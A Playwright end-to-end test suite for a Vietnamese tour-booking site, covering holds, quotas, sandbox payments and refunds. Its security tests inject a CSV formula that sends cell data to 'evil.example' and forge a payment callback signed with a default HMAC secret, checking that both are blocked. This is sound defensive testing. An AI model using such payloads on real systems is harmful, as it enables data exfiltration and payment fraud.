// UC-07 Đặt lịch có giữ chỗ và UC-08 Thanh toán thử nghiệm (sandbox) + hoàn tiền.
import fs from 'node:fs';
import path from 'node:path';
import { test, expect, request as pwRequest } from '@playwright/test';
import crypto from 'node:crypto';
import { AUTH_DIR, authFile, actual, shot, getPage, send, showText, registerFresh } from './helpers.js';

const ROUTE = 'dau-an-thang-long';
const TOUR = `/vi/tuyen-tham-quan/${ROUTE}`;
const state = {};

async function slotInfo(req, id) {
    const { page } = await getPage(req, TOUR);
    return page.props.route.slots.find((s) => s.id === id);
}

async function fillBooking(page, slotId, { qty, phone = '0912345678' }) {
    await page.goto(TOUR);
    await page.locator(`input[name="slot"][value="${slotId}"]`).check();
    const form = page.locator('#booking form');
    await form.locator('input[type="number"]').fill(String(qty));
    await form.locator('input[autocomplete="name"]').fill('Nguyễn Kiểm Thử');
    await form.locator('input[autocomplete="tel"]').fill(phone);
    await form.locator('input[autocomplete="email"]').fill('user@disanso.test');
    await form.locator('button[type="submit"]').click();
}

async function bookingProps(req, code) {
    return (await getPage(req, `/vi/dat-lich/${code}`)).page.props.booking;
}

async function payWith(page, code, outcome) {
    await page.goto(`/vi/dat-lich/${code}`);
    await page.getByRole('button', { name: 'Thanh toán ngay' }).click();
    await page.waitForURL(/cong-thanh-toan\/SB-/);
    const txn = page.url().split('/').pop();
    const label = { success: 'Thanh toán thành công', fail: 'Thanh toán thất bại', cancel: 'Hủy giao dịch' }[outcome];
    await page.getByRole('button', { name: label, exact: true }).click();
    await page.waitForURL(new RegExp(`/vi/dat-lich/${code}`));
    await page.waitForTimeout(500);
    return txn;
}

test.describe.serial('BOOK + PAY', () => {
    test.use({ storageState: authFile('member') });

    test('TC-BOOK-001 giữ chỗ 2 khách thành công, trừ chỗ và hiện đếm ngược', async ({ page }, ti) => {
        const before = await slotInfo(page.request, 3);
        await fillBooking(page, 3, { qty: 2 });
        await page.waitForURL(/\/vi\/dat-lich\/BK-/);
        state.code = page.url().split('/').pop();
        const after = await slotInfo(page.request, 3);
        const b = await bookingProps(page.request, state.code);
        actual(ti, `Tạo ${state.code}, status=${b.status}, total=${b.total_vnd} VND, seconds_left=${b.seconds_left}; chỗ trống ${before.available} → ${after.available}.`);
        await shot(page, 'TC-BOOK-001');
        expect(b.status).toBe('held');
        expect(after.available).toBe(before.available - 2);
        expect(b.total_vnd).toBe(2 * b.unit_price_vnd);
    });

    test('TC-BOOK-002 mã đặt lịch ngẫu nhiên, không lộ id tự tăng', async ({ page }, ti) => {
        const b = await bookingProps(page.request, state.code);
        const byId = await page.request.get(`/vi/dat-lich/${b.id}`);
        actual(ti, `Mã ${state.code} khớp ^BK-[A-Z0-9]{8}$: ${/^BK-[A-Z0-9]{8}$/.test(state.code)}; GET /vi/dat-lich/${b.id} (id số) → ${byId.status()}.`);
        await page.goto(`/vi/dat-lich/${b.id}`);
        await shot(page, 'TC-BOOK-002');
        expect(state.code).toMatch(/^BK-[A-Z0-9]{8}$/);
        expect(byId.status()).toBe(404);
    });

    test('TC-BOOK-003 số khách 0 (dưới biên) bị từ chối', async ({ page }, ti) => {
        await fillBooking(page, 4, { qty: 0 });
        const e = page.locator('#booking .field-error').first();
        await expect(e).toBeVisible();
        actual(ti, `Ở lại trang tuyến, lỗi: "${await e.innerText()}".`);
        await shot(page, 'TC-BOOK-003');
        expect(page.url()).not.toContain('/dat-lich/BK-');
    });

    test('TC-BOOK-004 số khách 11 (trên biên 10) bị từ chối', async ({ page }, ti) => {
        await fillBooking(page, 4, { qty: 11 });
        const e = page.locator('#booking .field-error').first();
        await expect(e).toBeVisible();
        actual(ti, `Lỗi: "${await e.innerText()}".`);
        await shot(page, 'TC-BOOK-004');
    });

    test('TC-BOOK-005 số khách 10 (đúng biên trên) được chấp nhận', async ({ browser }, ti) => {
        // Vòng 3: user@ đã giữ 2 + 1 chỗ trong ngày (seed + TC-BOOK-001) nên 10 chỗ sẽ vượt hạn mức 10 chỗ/ngày (M6)
        // → dùng tài khoản mới đăng ký; tài khoản này dùng tiếp cho TC-BOOK-011.
        test.setTimeout(150_000);
        state.freshA = await registerFresh(browser, 'bookA');
        const ctx = await browser.newContext({ storageState: state.freshA.file });
        const page = await ctx.newPage();
        await fillBooking(page, 5, { qty: 10 });
        await page.waitForURL(/\/vi\/dat-lich\/BK-/);
        const code = page.url().split('/').pop();
        const b = await bookingProps(page.request, code);
        await shot(page, 'TC-BOOK-005');
        // Dọn: hủy để trả chỗ (booking cancelled không tính vào hạn mức ngày)
        const c = await send(page.request, 'POST', `/vi/dat-lich/${code}/huy`, {}, { accept: 'html' });
        const after = await bookingProps(page.request, code);
        await ctx.close();
        actual(ti, `Tài khoản mới ${state.freshA.email}: tạo ${code}, quantity=${b.quantity}, status=${b.status}; hủy → ${c.status}, status=${after.status}.`);
        expect(b.quantity).toBe(10);
        expect(after.status).toBe('cancelled');
    });

    test('TC-BOOK-006 số điện thoại sai định dạng bị từ chối', async ({ page }, ti) => {
        await fillBooking(page, 4, { qty: 1, phone: '09ab-123' });
        const e = page.locator('#booking .field-error').first();
        await expect(e).toBeVisible();
        actual(ti, `Lỗi: "${await e.innerText()}".`);
        await shot(page, 'TC-BOOK-006');
    });

    test('TC-BOOK-007 giữ chỗ vượt sức chứa còn lại bị từ chối "Chỉ còn N chỗ"', async ({ page, browser }, ti) => {
        // Quản trị tạo khung giờ sức chứa 1 để kiểm biên
        const admin = await browser.newContext({ storageState: authFile('admin') });
        await admin.request.get('/vi');
        const guide = `QA V5 ${Date.now().toString(36)}`;
        const day = 10 + Math.floor(Math.random() * 18), hh = 7 + Math.floor(Math.random() * 10), mm = Math.floor(Math.random() * 60);
        const startsAt = `2026-12-${day} ${String(hh).padStart(2, '0')}:${String(mm).padStart(2, '0')}`;
        const r = await send(admin.request, 'POST', `/vi/quan-tri/tuyen-tham-quan/${ROUTE}/khung-gio`, { starts_at: startsAt, duration_minutes: 120, capacity: 1, guide_name: guide, language: 'vi' }, { accept: 'html' });
        await admin.close();
        const { page: p } = await getPage(page.request, TOUR);
        const slot = p.props.route.slots.find((s) => s.guide_name === guide);
        state.lastSeatSlot = slot.id;
        fs.writeFileSync(path.join(AUTH_DIR, 'last_seat_slot.txt'), String(slot.id));
        await fillBooking(page, slot.id, { qty: 2 });
        const e = page.locator('#booking .field-error').first();
        await expect(e).toBeVisible();
        const msg = await e.innerText();
        actual(ti, `Admin tạo khung giờ #${slot.id} ${startsAt} (sức chứa 1) → HTTP ${r.status}; đặt 2 khách → lỗi "${msg}".`);
        await shot(page, 'TC-BOOK-007');
        expect(msg).toMatch(/Chỉ còn 1 chỗ/);
    });

    test('TC-BOOK-008 hai người cùng đặt chỗ cuối cùng đồng thời: chỉ một thành công', async ({ page, browser }, ti) => {
        const c1 = await browser.newContext({ storageState: authFile('member') });
        const c2 = await browser.newContext({ storageState: authFile('member2') });
        await Promise.all([c1.request.get('/vi'), c2.request.get('/vi')]);
        const body = (n) => ({ quantity: 1, contact_name: n, contact_phone: '0912345678', contact_email: 'qa@disanso.test' });
        const [a, b] = await Promise.all([
            send(c1.request, 'POST', `/vi/dat-lich/${state.lastSeatSlot}`, body('Người A')),
            send(c2.request, 'POST', `/vi/dat-lich/${state.lastSeatSlot}`, body('Người B')),
        ]);
        await c1.close();
        await c2.close();
        const s = await slotInfo(page.request, state.lastSeatSlot);
        const ok = [a, b].filter((x) => [302, 303].includes(x.status) && x.location.includes('/dat-lich/BK-'));
        const rejected = [a, b].filter((x) => x.status === 422);
        const text = `A: HTTP ${a.status} ${a.location || JSON.stringify(a.body?.errors)}\nB: HTTP ${b.status} ${b.location || JSON.stringify(b.body?.errors)}\nKhung giờ #${state.lastSeatSlot}: capacity=${s.capacity}, booked_count=${s.booked_count}, available=${s.available}`;
        actual(ti, text.replace(/\n/g, '; '));
        await showText(page, 'TC-BOOK-008', 'Hai yêu cầu đồng thời giành chỗ cuối', text);
        expect(ok.length).toBe(1);
        expect(rejected.length).toBe(1);
        expect(s.booked_count).toBe(1);
    });

    test('TC-PAY-001 thanh toán thất bại: giao dịch failed, đặt lịch về held', async ({ page }, ti) => {
        state.txnFail = await payWith(page, state.code, 'fail');
        const b = await bookingProps(page.request, state.code);
        const p = b.payments.find((x) => x.txn_ref === state.txnFail);
        actual(ti, `${state.txnFail}: payment=${p?.status}; booking=${b.status}, can_pay=${b.can_pay}.`);
        await shot(page, 'TC-PAY-001');
        expect(p.status).toBe('failed');
        expect(b.status).toBe('held');
    });

    test('TC-PAY-002 người dùng hủy giao dịch tại cổng: payment cancelled', async ({ page }, ti) => {
        const txn = await payWith(page, state.code, 'cancel');
        const b = await bookingProps(page.request, state.code);
        const p = b.payments.find((x) => x.txn_ref === txn);
        actual(ti, `${txn}: payment=${p?.status}; booking=${b.status}, can_pay=${b.can_pay}.`);
        await shot(page, 'TC-PAY-002');
        expect(p.status).toBe('cancelled');
        expect(['held', 'pending_payment']).toContain(b.status);
    });

    test('TC-PAY-003 thanh toán thành công: booking paid, có thời điểm thanh toán', async ({ page }, ti) => {
        state.txnOk = await payWith(page, state.code, 'success');
        const b = await bookingProps(page.request, state.code);
        const p = b.payments.find((x) => x.txn_ref === state.txnOk);
        actual(ti, `${state.txnOk}: payment=${p?.status}, paid_at=${p?.paid_at}, amount=${p?.amount_vnd}; booking=${b.status}.`);
        await shot(page, 'TC-PAY-003');
        expect(p.status).toBe('succeeded');
        expect(b.status).toBe('paid');
    });

    test('TC-PAY-004 gửi lại kết quả cho giao dịch đã xử lý không đổi trạng thái', async ({ page }, ti) => {
        const r1 = await send(page.request, 'POST', `/vi/cong-thanh-toan/${state.txnOk}/ket-qua`, { outcome: 'fail' }, { accept: 'html' });
        const r2 = await send(page.request, 'POST', `/vi/cong-thanh-toan/${state.txnFail}/ket-qua`, { outcome: 'success' }, { accept: 'html' });
        const b = await bookingProps(page.request, state.code);
        const st = Object.fromEntries(b.payments.map((x) => [x.txn_ref, x.status]));
        await page.goto(`/vi/cong-thanh-toan/${state.txnOk}`);
        actual(ti, `Gửi fail cho ${state.txnOk} → ${r1.status}; gửi success cho ${state.txnFail} → ${r2.status}; sau đó booking=${b.status}, payments=${JSON.stringify(st)}.`);
        await shot(page, 'TC-PAY-004');
        expect(b.status).toBe('paid');
        expect(st[state.txnOk]).toBe('succeeded');
        expect(st[state.txnFail]).toBe('failed');
    });

    test('TC-PAY-005 hủy đặt lịch đã thanh toán (trước 24h) được hoàn tiền, trả chỗ', async ({ page }, ti) => {
        const before = await slotInfo(page.request, 3);
        await page.goto(`/vi/dat-lich/${state.code}`);
        await page.getByRole('button', { name: 'Hủy đặt lịch' }).click();
        await page.getByRole('alertdialog').getByRole('button').last().click();
        await page.waitForTimeout(1200);
        const b = await bookingProps(page.request, state.code);
        const after = await slotInfo(page.request, 3);
        actual(ti, `booking=${b.status}; payments=${b.payments.map((x) => `${x.txn_ref}:${x.status}`).join(', ')}; chỗ trống ${before.available} → ${after.available}.`);
        await shot(page, 'TC-PAY-005');
        expect(b.status).toBe('refunded');
        expect(after.available).toBe(before.available + 2);
    });

    test('TC-BOOK-009 hủy phiếu đang giữ chỗ trả lại chỗ cho khung giờ', async ({ page }, ti) => {
        await fillBooking(page, 6, { qty: 3 });
        await page.waitForURL(/\/vi\/dat-lich\/BK-/);
        const code = page.url().split('/').pop();
        const mid = await slotInfo(page.request, 6);
        await page.getByRole('button', { name: 'Hủy đặt lịch' }).click();
        await page.getByRole('alertdialog').getByRole('button').last().click();
        await page.waitForTimeout(1200);
        const b = await bookingProps(page.request, code);
        const after = await slotInfo(page.request, 6);
        actual(ti, `${code}: status=${b.status}, can_pay=${b.can_pay}; chỗ trống khi giữ ${mid.available} → sau hủy ${after.available}.`);
        await shot(page, 'TC-BOOK-009');
        expect(b.status).toBe('cancelled');
        expect(after.available).toBe(mid.available + 3);
    });
});

// ===== Vòng 3: hạn mức đặt chỗ (M6), tuyến nháp/xóa (M5), IPN khóa mặc định (H3), CSV injection (M3) =====
const DEFAULT_SECRET = 'sandbox-secret-change-me';
/** Ký payload giống SandboxGateway::sign (ksort + http_build_query RFC3986 + HMAC-SHA256). */
function signLikeGateway(payload, secret) {
    const enc = (v) => encodeURIComponent(String(v)).replace(/[!'()*]/g, (c) => '%' + c.charCodeAt(0).toString(16).toUpperCase());
    const canon = Object.keys(payload).sort().map((k) => `${enc(k)}=${enc(payload[k])}`).join('&');
    return crypto.createHmac('sha256', secret).update(canon).digest('hex');
}
const contact = (name) => ({ contact_name: name, contact_phone: '0912345678', contact_email: 'qa@disanso.test' });

test.describe.serial('BOOK – hạn mức và tính toàn vẹn (vòng 3)', () => {
    test.describe.configure({ timeout: 150_000 });

    test('TC-BOOK-011 giữ chỗ thứ 4 khi đang có 3 đặt lịch chưa thanh toán bị chặn', async ({ browser }, ti) => {
        if (!state.freshA) state.freshA = await registerFresh(browser, 'bookA');
        const ctx = await browser.newContext({ storageState: state.freshA.file });
        const page = await ctx.newPage();
        await page.goto('/vi');
        const formula = '=HYPERLINK("http://evil.example/?"&A2,"Mo")';
        state.quotaCodes = [];
        const codes = [];
        for (let i = 0; i < 3; i++) {
            const r = await send(page.request, 'POST', '/vi/dat-lich/9', { quantity: 1, ...contact(i === 0 ? formula : `QA hạn mức ${i + 1}`) });
            codes.push(r.status);
            if (r.location.includes('/dat-lich/BK-')) state.quotaCodes.push(r.location.split('/').pop());
        }
        await fillBooking(page, 9, { qty: 1 });
        const e = page.locator('#booking .field-error').first();
        await expect(e).toBeVisible();
        const msg = await e.innerText();
        await shot(page, 'TC-BOOK-011');
        const json = await send(page.request, 'POST', '/vi/dat-lich/9', { quantity: 1, ...contact('QA lần 4') });
        await ctx.close();
        actual(ti, `${state.freshA.email}: 3 lần giữ 1 chỗ khung giờ #9 → ${codes.join(', ')} (${state.quotaCodes.join(', ')}); lần 4 qua giao diện: "${msg}"; lần 4 gửi JSON → ${json.status} ${JSON.stringify(json.body?.errors ?? json.body).slice(0, 160)}.`);
        expect(state.quotaCodes.length).toBe(3);
        expect(msg).toMatch(/3 đặt lịch chưa thanh toán/);
        expect(json.status).toBe(422);
    });

    test('TC-SEC-016 IPN ký bằng khóa mặc định công khai bị từ chối 400, đặt lịch không thành paid', async ({ browser, baseURL, page }, ti) => {
        const ctx = await browser.newContext({ storageState: state.freshA.file });
        const own = await ctx.newPage();
        await own.goto('/vi');
        const code = state.quotaCodes[1];
        const pay = await send(own.request, 'POST', `/vi/dat-lich/${code}/thanh-toan`, {}, { accept: 'html' });
        const txn = pay.location.split('/').pop();
        const before = await bookingProps(own.request, code);
        const payload = { txn_ref: txn, amount: before.total_vnd, currency: 'VND', outcome: 'success', response_code: '00', pay_date: '20261018190000', nonce: 'qa-r3-forged-0001' };
        const api = await pwRequest.newContext({ baseURL, storageState: { cookies: [], origins: [] } });
        const forged = await api.post('/api/v1/payments/sandbox/ipn', { data: { ...payload, signature: signLikeGateway(payload, DEFAULT_SECRET) }, headers: { Accept: 'application/json' } });
        const forgedBody = await forged.text();
        const empty = await api.post('/api/v1/payments/sandbox/ipn', { data: { ...payload, signature: signLikeGateway(payload, '') }, headers: { Accept: 'application/json' } });
        await api.dispose();
        const after = await bookingProps(own.request, code);
        const p = after.payments.find((x) => x.txn_ref === txn);
        await ctx.close();
        const text = `Booking ${code}, giao dịch ${txn} (${before.total_vnd} VND), trạng thái trước: ${before.status}\nIPN success ký bằng "${DEFAULT_SECRET}" → HTTP ${forged.status()} ${forgedBody}\nIPN ký bằng khóa rỗng → HTTP ${empty.status()}\nSau đó: booking=${after.status}, payment=${p?.status}`;
        actual(ti, text.replace(/\n/g, '; '));
        await showText(page, 'TC-SEC-016', 'IPN giả mạo bằng khóa HMAC mặc định', text);
        expect(forged.status()).toBe(400);
        expect(forgedBody).toContain('Invalid signature');
        expect(empty.status()).toBe(400);
        expect(after.status).not.toBe('paid');
        expect(p?.status).toBe('initiated');
    });

    test('TC-SEC-019 xuất CSV đặt lịch vô hiệu hóa công thức trong tên liên hệ (CSV injection)', async ({ browser, page }, ti) => {
        const mgr = await browser.newContext({ storageState: authFile('manager') });
        const r = await mgr.request.get('/vi/quan-tri/thong-ke/xuat?type=bookings');
        const csv = (await r.text()).replace(/^\uFEFF/, '');
        const row = csv.split('\n').find((l) => l.includes(state.quotaCodes[0])) || '';
        await mgr.close();
        const text = `GET /vi/quan-tri/thong-ke/xuat?type=bookings → ${r.status()}\nTiêu đề: ${csv.split('\n')[0]}\nDòng của ${state.quotaCodes[0]} (contact_name gửi vào: =HYPERLINK(...)):\n${row}`;
        actual(ti, text.replace(/\n/g, '; '));
        await showText(page, 'TC-SEC-019', 'CSV injection – ô bắt đầu bằng =', text);
        expect(row).toContain(`'=HYPERLINK`);
        expect(row).not.toMatch(/(^|,)"?=HYPERLINK/);
    });

    test('TC-BOOK-012 hạn mức 10 chỗ/ngày: đã đặt 8 thì đặt thêm 3 bị chặn, thêm 2 được', async ({ browser }, ti) => {
        const acc = await registerFresh(browser, 'bookB');
        const ctx = await browser.newContext({ storageState: acc.file });
        const page = await ctx.newPage();
        await page.goto('/vi');
        const a = await send(page.request, 'POST', '/vi/dat-lich/9', { quantity: 8, ...contact('QA 8 chỗ') });
        await fillBooking(page, 9, { qty: 3 });
        const e = page.locator('#booking .field-error').first();
        await expect(e).toBeVisible();
        const msg = await e.innerText();
        await shot(page, 'TC-BOOK-012');
        const c = await send(page.request, 'POST', '/vi/dat-lich/9', { quantity: 2, ...contact('QA 2 chỗ') });
        const made = [a, c].filter((x) => x.location.includes('/dat-lich/BK-')).map((x) => x.location.split('/').pop());
        for (const code of made) await send(page.request, 'POST', `/vi/dat-lich/${code}/huy`, {}, { accept: 'html' });
        await ctx.close();
        actual(ti, `${acc.email}: giữ 8 chỗ → ${a.status}; thêm 3 chỗ qua giao diện → "${msg}"; thêm 2 chỗ → ${c.status} ${c.location.split('/').pop()}; đã hủy ${made.join(', ')}.`);
        expect(a.location).toContain('/dat-lich/BK-');
        expect(msg).toMatch(/tối đa 10 chỗ.*còn 2 chỗ/);
        expect(c.location).toContain('/dat-lich/BK-');
    });

    test('TC-BOOK-013 không giữ chỗ được trên khung giờ của tuyến nháp hoặc tuyến đã xóa', async ({ browser, page }, ti) => {
        const ct = await browser.newContext({ storageState: authFile('contributor') });
        await ct.request.get('/vi');
        const slug = `qa-nhap-${Date.now().toString(36)}`;
        const { page: form } = await getPage(ct.request, '/vi/quan-tri/tuyen-tham-quan/moi');
        const created = await send(ct.request, 'POST', '/vi/quan-tri/tuyen-tham-quan', {
            slug, duration_minutes: 120, difficulty: 'de', price_vnd: 100000, default_capacity: 10, status: 'draft',
            translations: { vi: { name: `Tuyến nháp ${slug}`, description: 'Kiểm thử M5' } },
            stops: [{ site_id: form.props.sites[0].id, stop_order: 1, dwell_minutes: 60 }],
        }, { accept: 'html' });
        await send(ct.request, 'POST', `/vi/quan-tri/tuyen-tham-quan/${slug}/khung-gio`, { starts_at: '2026-12-02 08:00', duration_minutes: 120, capacity: 10, guide_name: 'QA V5 M5', language: 'vi' }, { accept: 'html' });
        const slotId = (await getPage(ct.request, `/vi/quan-tri/tuyen-tham-quan/${slug}/sua`)).page.props.route.slots[0].id;
        const mem = await browser.newContext({ storageState: authFile('member') });
        await mem.request.get('/vi');
        const draft = await send(mem.request, 'POST', `/vi/dat-lich/${slotId}`, { quantity: 1, ...contact('QA tuyến nháp') });
        const del = await send(ct.request, 'DELETE', `/vi/quan-tri/tuyen-tham-quan/${slug}`, {}, { accept: 'html' });
        const deleted = await send(mem.request, 'POST', `/vi/dat-lich/${slotId}`, { quantity: 1, ...contact('QA tuyến đã xóa') });
        await mem.close();
        await ct.close();
        const err = (x) => JSON.stringify(x.body?.errors ?? x.body?.message ?? x.location);
        const text = `Contributor tạo tuyến nháp ${slug} → ${created.status}, khung giờ #${slotId}\nuser@ POST /vi/dat-lich/${slotId} (tuyến draft) → ${draft.status} ${err(draft)}\nContributor xóa tuyến (xóa mềm) → ${del.status}\nuser@ POST /vi/dat-lich/${slotId} (tuyến đã xóa) → ${deleted.status} ${err(deleted)}`;
        actual(ti, text.replace(/\n/g, '; '));
        await showText(page, 'TC-BOOK-013', 'Đặt chỗ trên tuyến nháp / đã xóa mềm', text);
        expect(draft.status).toBe(422);
        expect([404, 422]).toContain(deleted.status);
        expect(draft.location).toBe('');
        expect(deleted.location).toBe('');
    });

    test.afterAll(async ({ browser }) => {
        // Dọn: hủy 3 booking của TC-BOOK-011 (một cái đang pending_payment sau TC-SEC-016)
        if (!state.freshA || !state.quotaCodes) return;
        const ctx = await browser.newContext({ storageState: state.freshA.file });
        await ctx.request.get('/vi');
        for (const code of state.quotaCodes) await send(ctx.request, 'POST', `/vi/dat-lich/${code}/huy`, {}, { accept: 'html' });
        await ctx.close();
    });
});

test.describe.serial('PAY – quản trị hoàn tiền', () => {
    test.use({ storageState: authFile('member2') });
    test('TC-PAY-006 quản trị chuyển đặt lịch paid → refunded, tạo bút toán hoàn tiền', async ({ page, browser }, ti) => {
        await page.goto('/vi');
        const created = await send(page.request, 'POST', '/vi/dat-lich/7', { quantity: 1, contact_name: 'Thành viên 1', contact_phone: '0912345678', contact_email: 'member1@disanso.test' });
        const code = created.location.split('/').pop();
        const pay = await send(page.request, 'POST', `/vi/dat-lich/${code}/thanh-toan`, {}, { accept: 'html' });
        const txn = pay.location.split('/').pop();
        await send(page.request, 'POST', `/vi/cong-thanh-toan/${txn}/ket-qua`, { outcome: 'success' }, { accept: 'html' });
        const paid = await bookingProps(page.request, code);
        const admin = await browser.newContext({ storageState: authFile('manager') });
        await admin.request.get('/vi');
        const r = await send(admin.request, 'PATCH', `/vi/quan-tri/dat-lich/${code}/trang-thai`, { status: 'refunded', reason: 'QA kiểm thử hoàn tiền' });
        const bad = await send(admin.request, 'PATCH', `/vi/quan-tri/dat-lich/${code}/trang-thai`, { status: 'paid' }, { accept: 'html', headers: { Referer: 'http://localhost:8080/vi/quan-tri/dat-lich' } });
        const flash = bad.location ? (await getPage(admin.request, bad.location)).page.props.flash : {};
        const ap = await admin.newPage();
        await ap.goto(`/vi/quan-tri/dat-lich?q=${code}`);
        await shot(ap, 'TC-PAY-006');
        await admin.close();
        const b = await bookingProps(page.request, code);
        actual(ti, `${code}: ${paid.status} → PATCH refunded ${r.status} → ${b.status}; payments=${b.payments.map((x) => `${x.txn_ref}:${x.status}`).join(', ')}; chuyển tiếp không hợp lệ refunded→paid → ${bad.status}, flash lỗi "${flash.error ?? ''}".`);
        expect(b.status).toBe('refunded');
        expect(b.payments.some((x) => x.status === 'refunded')).toBe(true);
        expect(flash.error).toBeTruthy();
    });
});
